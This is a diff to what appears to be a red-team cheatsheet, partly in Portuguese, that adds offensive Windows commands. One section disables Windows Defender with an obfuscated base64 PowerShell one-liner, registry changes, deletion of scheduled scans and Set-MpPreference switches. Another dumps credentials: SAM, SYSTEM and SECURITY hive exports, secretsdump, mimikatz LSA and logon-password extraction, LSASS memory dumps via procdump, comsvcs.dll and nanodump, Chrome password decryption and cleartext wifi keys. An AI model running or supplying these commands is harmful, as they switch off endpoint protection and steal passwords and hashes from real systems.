@@ -134,13 +134,112 @@ REFS:
 - https://github.com/gentilkiwi/mimikatz/wiki
 
 
-#### Scripts para recon e para extrait passwords da memória, navegadores e etc:
+#### Disabling Windows Defender
 
+- Stop Windows Defender from executing on Startup
+```
+powershell -command "$x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VwBpA'+'G4ARA B'+'lAGYA'+'ZQB'+'uAG'+'QA'));Stop-Service -Name $x;Set-Service -StartupType Disabled $x"
+```
+
+Disabling antivirus and anti-spyware protections via the HKLM\SOFTWARE\MICROSOFT\WINDOWS DEFENDER registry key and adding the value “*.exe” to the HKLM\SOFTWARE\MICROSOFT\WINDOWS DEFENDER\EXCLUSIONS\EXTENSIONS registry key.
+
+
+> reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
+
+```
+schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f
+schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenanca" /f
+schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f
+schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f
+
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableArchiveScanning $true
+Set-MpPreference -DisableBehaviorMonitoring $true
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisableIntrusionPreventionSystem $true
+Set-MpPreference -DisableScanningNetworkFiles $true
+Set-MpPreference -MAPSReporting 0
+Set-MpPreference -DisableCatchupFullScan $True
+```
+
+- https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/#c06
+
+
+#### Cheatsheet commands
+
+- dump registry hives (admin access)
+
+```
+> reg save HKLM\SAM C:\path\to\output\sam.hiv
+> reg save HKLM\SYSTEM C:\path\to\output\system.hiv
+> reg save HKLM\SECURITY C:\path\to\output\security.hiv
+
+impacket-secretsdump -sam C:\sam.hiv -system C:\system.hiv local
+
+mimikatz # lsadump::sam /sam:C:\sam.hiv /system:C:\system.hiv
+```
+
+- Lsa Dump 
+
+```
+mimikatz # token::elevate lsadump::secrets
+
+
+mimikatz # lsadump::secrets /system:C:\system.hiv /security:C:\security.hiv
+
+
+impacket-secretsdump -security C:\security.hiv -system C:\system.hiv local
+```
+
+- Lsass Dump
+
+```
+- prodump (need admin access)
+
+> procdump.exe -accepteula -ma lsass.exe C:\path\to\output
+
+- comsvcs.dll (maybe need system access)
+
+> rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass-pid> C:\path\to\output
+
+- nanodump
+
+> nanodump.exe --write C:\path\to\output
+> nanodump.exe --silent-process-exit C:\path\to\output
+
+- dumpert
+
+> Outflank-Dumpert.exe
+
+
+- extract creds from dump file
+
+> mimikatz # sekurlsa::minidump C:\path\to\dumpfile
+> mimikatz # sekurlsa::logonpasswords
+```
+
+- Credential Manager
+
+```
+mimikatz # privilege::debug
+
+mimikatz # sekurlsa::credman
+```
+
+- Chrome Decryption (Normal user context)
 ```mimikatz # dpapi::chrome /in:"C:\Users\USERNAME\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect```
 
 ```mimikatz.exe "token::elevate" "lsadump::secrets" exit```
 
-- wifi pass ```netsh wlan show profile name=ESSID key=clear```
+
+- wifi pass 
+
+```netsh wlan show profile name=ESSID key=clear```
+
+
+
+#### Scripts para recon e para extrait passwords da memória, navegadores e etc:
+
 
 - Chrome, FireFox, Opera e mais https://github.com/AlessandroZ/LaZagne
   - ```Lazagne.exe browsers -firefox```
